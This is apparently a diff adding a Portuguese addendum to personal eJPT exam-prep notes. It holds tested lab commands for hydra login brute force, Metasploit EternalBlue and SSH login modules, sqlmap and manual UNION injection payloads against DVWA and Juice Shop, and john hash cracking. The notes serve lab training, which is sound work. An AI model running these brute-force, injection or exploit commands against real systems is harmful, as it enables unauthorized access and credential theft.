@@ -525,4 +525,158 @@ Limites reais (medidos hoje):
 
 Regra: se o comando passa de 2 minutos, roda em background e segue para outro host.
 
+---
+
+# ADENDO 21/OUT — ARMADILHAS MEDIDAS HOJE (ler antes do exame)
+
+Tudo aqui foi executado nesta máquina em 21/out. Onde diz "falso positivo", eu caí na armadilha
+primeiro e depois achei a saída.
+
+## F.1 hydra — o que ele realmente tem, e quando ele mente
+
+Módulos compilados (lista real de `hydra -h`):
+```
+adam6500 asterisk cisco cisco-enable cobaltstrike cvs ftp http-{head|get|post}
+http-{get|post}-form http-proxy http-proxy-urlenum icq imap irc ldap2 ldap3[s] mssql mysql(v4)
+nntp pcanywhere pcnfs pop3 redis rexec rlogin rpcap rsh rtsp s7-300 smb smtp smtp-enum snmp
+socks5 teamspeak telnet vmauthd vnc xmpp
+```
+**Não tem:** `ssh`, `sshkey`, `rdp`, `ftp[s]` (SSL), `smb2`, regex. Confirmado:
+`hydra -l a -p b 127.0.0.1 ssh` → `[ERROR] Compiled without LIBSSH v0.4.x support`.
+
+### Falso positivo — a armadilha que custa tempo no exame
+```bash
+hydra -l admin -P lista.txt 127.0.0.1 -s 8080 http-get /login.php
+# saída: login: admin   password: admin     <-- MENTIRA
+```
+`http-get` considera sucesso qualquer resposta que não seja 401. Se a página devolve 200 para
+todo mundo (formulário de login, por exemplo), **qualquer senha "funciona"**.
+Nunca acreditar em resultado de `http-get`/`http-head` sem testar a senha na mão depois.
+
+Forma correta — condição de falha explícita:
+```bash
+# http-post-form: URL:corpo:F=string_que_aparece_quando_ERRA
+hydra -l admin -P ~/wordlists/pass/top1000.txt IP -s 8080 http-post-form \
+  "/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed"
+
+# http-get-form (login por GET): mesma lógica
+hydra -l admin -P ~/wordlists/pass/top1000.txt IP http-get-form \
+  "/login.php:username=^USER^&password=^PASS^:F=Login failed"
+
+# dica: achar a string de falha primeiro
+curl -s -d "username=admin&password=errada&Login=Login" http://IP/login.php | grep -i "failed\|incorrect\|invalid"
+```
+`S=` (string de sucesso) é a alternativa quando não existe mensagem de erro clara.
+
+**Se o formulário tiver CSRF token (hidden `user_token`/`csrf`), hydra NÃO funciona** — o token
+muda a cada requisição. Caminho: Burp Intruder (Kali da INE) ou Python com `requests.Session`
+lendo o token antes de cada POST (modelo pronto: `~/LIBERTUS/ejpt/web_login.py`).
+
+## F.2 Metasploit — as duas regras do snap (validadas hoje)
+
+```bash
+# 1) comando avulso: usar -x, nunca arquivo em /tmp
+msfconsole -q -x "search ms17-010; exit"
+
+# 2) resource script: OBRIGATÓRIO estar em $HOME e SEM ponto no nome
+msfconsole -q -r /home/libertus/msf.rc        # OK
+msfconsole -q -r /tmp/msf.rc                  # [-] Cannot find resource script
+msfconsole -q -r /home/libertus/.msf.rc       # Permission denied (Errno::EACCES)
+```
+
+Fluxo com banco (funciona — `msfdb status` = Database started):
+```bash
+msfconsole -q
+db_nmap -sV -p- --min-rate 3000 IP    # scan já entra no banco
+hosts                                  # hosts descobertos
+services -R 10.10.10.5                 # só serviços daquele host
+services -p 445                        # filtrar por porta = achar alvo rápido
+```
+`db_nmap` usa o nmap embutido do snap (7.95). O `nmap` da linha de comando é 7.992 — não é problema.
+
+Verificação de módulo (fazer ANTES de usar, em 2 s):
+```bash
+msfconsole -q -x "info exploit/windows/smb/ms17_010_eternalblue; exit" | head -20
+```
+Módulos confirmados nesta máquina: `exploit/windows/smb/ms17_010_eternalblue`,
+`exploit/windows/smb/ms17_010_psexec`, `auxiliary/admin/smb/ms17_010_command`,
+`auxiliary/scanner/smb/smb_ms17_010`, `auxiliary/scanner/smb/smb_login`,
+`auxiliary/scanner/ssh/ssh_login`, `auxiliary/scanner/portscan/tcp`,
+`auxiliary/scanner/ftp/ftp_login`, `auxiliary/scanner/ftp/ftp_version`.
+
+## F.3 Wordlists — caminhos que existem de verdade (contagem medida)
+
+| Caminho | Palavras | Uso |
+|---|---|---|
+| `~/wordlists/web/directory-list-2.3-medium.txt` | 220.559 | gobuster completo (lento) |
+| `~/wordlists/web/directory-list-2.3-small.txt` | 87.663 | gobuster padrão bom |
+| `~/wordlists/web/raft-small-words.txt` | 43.007 | **melhor custo/benefício** |
+| `~/wordlists/web/raft-medium-directories.txt` | 29.999 | só diretórios |
+| `~/wordlists/web/subdomains-5000.txt` | 5.000 | vhost/dns |
+| `~/wordlists/pass/top1000.txt` | 1.000 | hydra rápido |
+| `~/wordlists/pass/top10k.txt` | 10.000 | hydra médio |
+| `~/wordlists/user/top-usernames.txt` | 10 | usuários comuns |
+| `/usr/share/wordlists/rockyou.txt` | 13.992.149 | john/hydra último recurso |
+| `/usr/share/wordlists/common.txt` | 4.000 | web rápido |
+
+`/usr/share` **não é visível para o msf** (snap). Para `PASS_FILE` no msf, usar caminho em `$HOME`.
+No Kali da INE: `/usr/share/wordlists/dirb/common.txt` e `/usr/share/wordlists/rockyou.txt`.
+
+## F.4 SQLmap em alvo autenticado (receita que rodou hoje)
+
+SQLi atrás de login é o caso mais comum e o que mais trava. Sequência:
+```bash
+# 1) logar e pegar o cookie (Python, porque CSRF token exige ler a página antes)
+python3 ~/LIBERTUS/ejpt/web_login.py -u http://IP/login.php -l admin -p password --extra "Login=Login"
+# -> COOKIE_PARA_SQLMAP=PHPSESSID=abc123; security=low
+
+# 2) sqlmap com a sessão
+sqlmap -u "http://IP/vulnerabilities/sqli/?id=1&Submit=Submit" \
+  --cookie="PHPSESSID=abc123; security=low" --batch --dbs --threads=4
+```
+Resultado real de hoje no DVWA: 4 técnicas detectadas (boolean, error, time, UNION), DBMS
+`MySQL >= 5.0 (MariaDB fork)`, banco `dvwa` listado.
+
+Se sqlmap disser "not injectable": testar UNION na mão antes de desistir.
+```bash
+curl -s "http://IP/page?id=1' UNION SELECT 1,2,3-- -"
+# contar colunas até a página parar de dar erro; depois:
+curl -s "http://IP/page?id=1' UNION SELECT 1,user(),database(),4-- -"
+```
+Exemplo real (Juice Shop, funciona — sqlmap NÃO acha):
+```bash
+curl -s -G "http://localhost:3000/rest/products/search" \
+  --data-urlencode "q=test')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM Users--"
+```
+
+## F.5 john — formato certo ou ele "roda e não acha"
+
+```bash
+john --format=raw-md5      --wordlist=~/wordlists/pass/top10k.txt h.txt   # MD5 puro
+john --format=nt           --wordlist=~/wordlists/pass/top10k.txt h.txt   # NTLM (Windows)
+john --format=sha512crypt  --wordlist=~/wordlists/pass/top10k.txt h.txt   # /etc/shadow Linux
+john --format=bcrypt       --wordlist=~/wordlists/pass/top10k.txt h.txt   # bcrypt
+john --show h.txt                                                         # ver resultado
+```
+Hoje: 2 hashes MD5 do DVWA → `admin:password` em <1 s.
+Se o `--format` estiver errado, john não reclama com clareza — só não acha nada. Na dúvida:
+`john --list=formats | tr ',' '\n' | grep -i md5`.
+
+## F.6 SSH nesta máquina (hydra não tem, estas três rotas têm)
+
+```bash
+# 1) ssh_brute.py — mais rápido (usa python do venv, senão falta paramiko)
+~/venvs/pentest/bin/python ~/LIBERTUS/ejpt/ssh_brute.py -t IP -p 22 -l users.txt -P pass.txt -T 8
+
+# 2) Metasploit ssh_login — abre sessão direto (VERBOSE true para ver o acerto)
+msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login; set RHOSTS IP; set USERNAME root; \
+ set PASS_FILE /home/libertus/wordlists/pass/top10k.txt; set STOP_ON_SUCCESS true; \
+ set VERBOSE true; run; exit"
+
+# 3) nmap
+nmap -p22 --script ssh-brute --script-args userdb=users.txt,passdb=pass.txt IP
+```
+Hoje: `msfadmin:msfadmin` achado em 0,1 s contra o lab em 127.0.0.1:2222.
+
+
 
